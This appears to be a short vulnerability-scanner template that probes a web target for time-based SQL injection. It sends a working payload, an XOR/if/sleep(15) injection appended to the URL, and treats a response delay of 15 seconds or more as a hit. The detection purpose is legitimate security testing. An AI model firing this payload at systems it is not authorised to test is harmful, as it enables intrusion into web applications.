id: time-based-sql-injection

info:
  name: Time Based SQL Injection
  author: shelled
  severity: high
  description: Detects time based SQL injection.
  tags: sqli, generic, time
  
requests:
  - raw:
    - |
      GET {{BaseURL}}0\"XOR(if(now()=sysdate(),sleep(15),0))XOR\"Z HTTP/1.1
      Host: {{Hostname}}

  matchers:
    - type: dsl
      dsl:
        - 'duration>=15'
